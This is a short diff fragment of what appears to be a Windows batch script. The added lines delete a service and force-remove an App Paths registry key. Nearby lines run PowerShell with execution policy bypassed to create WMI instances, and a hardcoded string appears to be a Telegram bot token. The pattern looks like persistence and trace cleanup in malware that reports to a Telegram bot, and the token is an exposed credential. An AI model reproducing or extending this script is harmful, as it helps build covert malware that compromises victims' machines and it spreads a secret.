@@ -57,6 +57,8 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Nam
 
 sc start Configuration
 sc start Performance
+sc delete Help
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /f
 
 chcp 65001 >nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
